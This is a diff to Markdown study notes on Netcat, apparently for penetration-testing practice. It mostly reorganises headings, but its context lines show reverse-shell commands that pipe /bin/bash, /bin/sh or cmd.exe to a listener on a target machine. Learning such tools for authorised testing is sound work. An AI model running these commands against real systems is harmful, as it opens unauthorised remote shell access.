@@ -2,18 +2,23 @@
 > Netcat (the "TCP/IP Swiss Army Knife") is a networking utility used to read and write data to network connections using TCP or UDP.
 
 ## Contents
-- [](#)
-- [](#)
-- [](#)
-- [](#)
-- [](#)
-- [](#)
-- [](#)
-- [](#)
-- [](#)
-- [](#)
+- [Intro](#)
+  - [Remote Access Tool](#)
+  - [Two Modes](#)
+  - [Options](#)
+- [Connecting to Ports (client mode)](#)
+  - [Standard Syntax](#)
+  - [Additional Information](#)
+  - [Manually Check Ports](#)
+- [Listener](#)
+- [Connect](#)
+  - [Connect to listener from Linux](#)
+  - [Connect to listener from Windows](#)
+- [File Input/Output](#)
 
-## Remote Access Tool
+## Intro
+
+### Remote Access Tool
 - NetCat is a popular remote access tool.
 - It has a small footprint so it's portable. It can set up a reverse shell easily.
   - In Kali the Windows executable is found here: `/usr/share/windows-binaries/nc.exe`
@@ -24,12 +29,12 @@
   - Bind/Reverse Shells
 - Resources: [Simple How-To](https://jeffreytse.net/computer/2020/10/14/how-to-use-netcat-command.html) | [Basic Usage](https://www.geeksforgeeks.org/netcat-basic-usage-and-overview/)
 
-## Two Modes
+### Two Modes
 - Netcat utilizes a client-server communication architecture with two modes:
   - **Client [Connect] Mode:** Netcat can be used in a client mode to connect to any TCP/UDP port; it can also be used to connect to a remote listener (a remote Netcat server).
   - **Server [LIsten] Mode:** Netcat can be used to listen for connections from clients on a specific port.
 
-## Options
+### Options
 - Some options to be aware of...
 - `-v  --verbose` : set verbosity levels (`-v` is lower level, `-vv` is more, `-vvv`, etc.)
 - `-u  --udp` : use UDP instead of the default TCP
@@ -70,13 +75,13 @@ nc -nvlup 1234    # UDP listener
 
 ## Connect
 
-### Connect to the listener from a Linux target machine:
+### Connect to the listener from a Linux target machine
 ```
 nc [listener IP] [port] –e /bin/bash
 nc [listener IP] [port] –e /bin/sh
 ```
 
-### Connect to the listener from a Windows target machine:
+### Connect to the listener from a Windows target machine
 ```
 nc.exe [listener IP] [port] –e cmd.exe
 ```
